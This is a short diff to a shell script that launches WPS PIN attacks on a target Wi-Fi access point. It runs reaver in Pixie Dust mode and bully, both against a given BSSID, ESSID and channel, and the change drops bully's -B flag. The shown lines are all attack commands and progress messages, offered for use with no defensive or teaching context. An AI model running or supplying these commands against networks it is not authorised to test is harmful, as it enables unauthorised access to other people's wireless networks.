@@ -25,7 +25,7 @@ echo "Target ESSID is:" $bname
 reaver -i $interface -b $tmac -c $channel -vvv -K -t 10 -f
 echo "Reaver attack finised"
 # Bully
-bully $interface -b $tmac -e $bname -c $channel -dFBW -l 45 -t 30
+bully $interface -b $tmac -e $bname -c $channel -dFW -l 45 -t 30
 echo "Bully attack finished"
 echo "If that didnt work, Well, We tried!"
 echo "If this failed, you may have used incorrect information, or the AP is not vulernable (WPS)"
